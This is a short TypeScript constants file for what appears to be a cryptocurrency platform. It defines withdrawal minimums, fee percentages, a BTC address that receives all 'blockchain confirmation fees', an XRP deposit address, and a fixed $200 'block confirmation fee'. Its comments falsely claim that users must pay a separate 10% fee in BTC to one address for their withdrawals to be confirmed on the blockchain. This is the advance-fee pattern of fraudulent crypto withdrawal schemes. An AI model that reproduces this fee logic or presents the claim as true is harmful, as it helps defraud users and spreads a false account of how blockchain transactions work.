// Transaction and fee constants

/**
 * Minimum withdrawal amount in USD
 */
export const MINIMUM_WITHDRAWAL_AMOUNT = 10;

/**
 * Blockchain confirmation fee percentage for withdrawals
 * This fee is paid separately by the user (not deducted from withdrawal)
 * Example: For a $100 withdrawal, user pays $10 fee separately and receives full $100
 */
export const WITHDRAWAL_FEE_PERCENTAGE = 0.10;

/**
 * XRP withdrawal fee percentage (2% - different from other currencies)
 */
export const XRP_WITHDRAWAL_FEE_PERCENTAGE = 0.02;

/**
 * BTC wallet address for receiving ALL blockchain confirmation fees
 * Users must pay the 10% fee to this address in a single transaction
 * All confirmation fees are paid in BTC regardless of withdrawal currency
 */
export const CONFIRMATION_FEE_WALLET_BTC = "bc1qhnfj2sa5wjs52de36gnlu4848g8870amu5epxh";

/**
 * Platform XRP wallet address for receiving deposits
 */
export const PLATFORM_WALLET_XRP = "ranmERjBSRh9Z3Dp9pPsHFv2Uhk6i2aP37";

/**
 * Fixed blockchain confirmation fee amount in USD
 * This is a required fee for all transactions to be confirmed on the blockchain
 */
export const BLOCK_CONFIRMATION_FEE = 200;
